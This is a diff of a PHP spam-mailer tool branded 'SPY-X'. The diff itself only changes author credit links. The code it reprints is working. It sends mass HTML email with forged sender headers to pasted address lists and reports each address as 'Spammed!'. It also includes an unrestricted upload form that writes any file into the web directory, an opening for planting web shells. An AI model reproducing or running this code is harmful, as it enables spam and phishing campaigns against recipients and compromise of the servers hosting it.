@@ -3,7 +3,7 @@
 ###############################################################
 #      Page Password Protect 1.16   and Super-Mailer          #
 ###############################################################
-#           Visit www.facebook.com/mrrb.net for updates       #
+#      Visit www.facebook.com/omarrbiai.org for updates       #
 ############################################################### 
 
 // Add login/password pairs below, like described above
@@ -311,7 +311,7 @@ padding-bottom: 5px;
 <body style="background-color:black;" style="font-family: Arial; font-size: 11px">
 <center>  <font color="Green"> <h1 class="flash">Mailer INBOX To ALL BY SPY-X</h1></font></center>
 <ul>
-<center> <font color="#FFFF00"><li><a  title="OK" href="https://www.facebook.com/mrrb.net">www.facebook.com/mrrb.net</a></li> </font></center></h2></font></center>
+<center> <font color="#FFFF00"><li><a  title="OK" href="https://www.facebook.com/omarrbiai.org">www.facebook.com/mrrb.net</a></li> </font></center></h2></font></center>
 </ul>
 <center>
 <form action="" method="post" enctype="multipart/form-data" name="form1">
@@ -359,7 +359,7 @@ padding-bottom: 5px;
         <input name="archivo" type="file" size="35" />
         <input name="enviar" type="submit" value="Upload File" />
         <input name="action" type="hidden" value="upload" />     
-	</form>'; $status = ""; if ($_POST["action"] == "upload") { $tamano = $_FILES["archivo"]['size']; $tipo = $_FILES["archivo"]['type']; $archivo = $_FILES["archivo"]['name']; if ($archivo != "") { if (copy($_FILES['archivo']['tmp_name'],"./".$archivo)) { $status = "Archivo subido: <b>".$archivo."</b>"; }else{ $status = "Error al subir el archivo"; } } else { $status = "Error al subir archivo"; } echo $status; } } if(!isset($_POST['Enoc'])){ exit; } if(!isset($_GET['c'])) { $email = explode("\n", $ellos); }else{ $email = explode(",", $ellos); } $son = count($email); if(!isset($_GET['e'])){ $header = "MIME-Version: 1.0\n"; $header .= "Content-type: text/html; charset=iso-8859-1\n"; $header .= "From: ".$nombre . " <" . $de . ">\n"; $header .= "Reply-To: " . $de . "\n"; $header .= "X-Priority: 3\n"; $header .= "X-MSMail-Priority: Normal\n"; $header .= "X-Mailer: ".$_SERVER["HTTP_HOST"]; }else{ $header ='MIME-Version: 1.0' . "\r\n"; $header .= 'Content-type: text/html' . "\r\n"; $header .="From: ".$de; } $i = 0; $voy=1; while($email[$i]) { if(isset($_GET['time']) && isset($_GET['cant'])){ if(fmod($i,$_GET['cant'])==0 && $i>0){ print "----------------------------------> wait ".$_GET['time']." Segs. Sending to ".$_GET['notf']."...<br>\n"; flush(); @mail($_GET['notf'], $subject, $message, $header); sleep($_GET['time']); } } $mail = str_replace(array("\n","\r\n"),'',$email[$i]); $message1 = str_replace('asterisco', $mail, $message); if(@mail($mail, $subject, $message1, $header)) { print "<font color=White face=verdana size=1>    ".$voy." To ".$son."  ===> ".trim($mail)."  Spammed!</font><br>\n"; flush(); } else { print "<font color=Red face=verdana size=1>    ".$voy." To ".$son."  ===> ".trim($mail)."  Error To Sending Fuck Server !</font><br>\n"; flush(); } $i++; $voy++; } echo "<script> alert('Tools BY SPY-X FB www.fb.com/mrrb.net'); </script>"; ?>
+	</form>'; $status = ""; if ($_POST["action"] == "upload") { $tamano = $_FILES["archivo"]['size']; $tipo = $_FILES["archivo"]['type']; $archivo = $_FILES["archivo"]['name']; if ($archivo != "") { if (copy($_FILES['archivo']['tmp_name'],"./".$archivo)) { $status = "Archivo subido: <b>".$archivo."</b>"; }else{ $status = "Error al subir el archivo"; } } else { $status = "Error al subir archivo"; } echo $status; } } if(!isset($_POST['Enoc'])){ exit; } if(!isset($_GET['c'])) { $email = explode("\n", $ellos); }else{ $email = explode(",", $ellos); } $son = count($email); if(!isset($_GET['e'])){ $header = "MIME-Version: 1.0\n"; $header .= "Content-type: text/html; charset=iso-8859-1\n"; $header .= "From: ".$nombre . " <" . $de . ">\n"; $header .= "Reply-To: " . $de . "\n"; $header .= "X-Priority: 3\n"; $header .= "X-MSMail-Priority: Normal\n"; $header .= "X-Mailer: ".$_SERVER["HTTP_HOST"]; }else{ $header ='MIME-Version: 1.0' . "\r\n"; $header .= 'Content-type: text/html' . "\r\n"; $header .="From: ".$de; } $i = 0; $voy=1; while($email[$i]) { if(isset($_GET['time']) && isset($_GET['cant'])){ if(fmod($i,$_GET['cant'])==0 && $i>0){ print "----------------------------------> wait ".$_GET['time']." Segs. Sending to ".$_GET['notf']."...<br>\n"; flush(); @mail($_GET['notf'], $subject, $message, $header); sleep($_GET['time']); } } $mail = str_replace(array("\n","\r\n"),'',$email[$i]); $message1 = str_replace('asterisco', $mail, $message); if(@mail($mail, $subject, $message1, $header)) { print "<font color=White face=verdana size=1>    ".$voy." To ".$son."  ===> ".trim($mail)."  Spammed!</font><br>\n"; flush(); } else { print "<font color=Red face=verdana size=1>    ".$voy." To ".$son."  ===> ".trim($mail)."  Error To Sending Fuck Server !</font><br>\n"; flush(); } $i++; $voy++; } echo "<script> alert('Tools BY SPY-X FB www.fb.com/omarrbiai.org'); </script>"; ?>
 </td>
 </tr>
 </table>
